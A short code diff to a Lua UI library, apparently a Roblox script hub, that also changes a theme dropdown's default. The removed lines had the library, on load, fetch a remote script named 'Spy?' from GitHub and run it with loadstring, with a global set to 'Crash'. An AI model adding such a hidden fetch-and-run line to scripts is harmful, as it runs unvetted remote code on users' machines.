@@ -1,5 +1,4 @@
-getgenv().Action = "Crash" -- Available Action: "Rejoin", "Crash"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/jianlobiano/Triple-T/refs/heads/main/Spy%3F"))()
+
 local Library = {}
 local CoreGui = game:GetService("CoreGui")
 local Players = game:GetService("Players")
@@ -2332,7 +2331,7 @@ for _, obj in pairs(UI_Elements.TextGradients) do
     
     local ThemeTab = Window:CreateTab("Themes", false, "rbxassetid://136384267867469")
     ThemeTab:CreatePageTitle("Themes")
-    ThemeTab:CreateDropdown("Select Theme", "Dream", {"Ocean", "Dream", "Dark"}, "Change UI colors", function(selected)
+    ThemeTab:CreateDropdown("Select Theme", "", {"Ocean", "Dream", "Dark"}, "Change UI colors", function(selected)
         Window:ApplyTheme(selected)
     end)
     
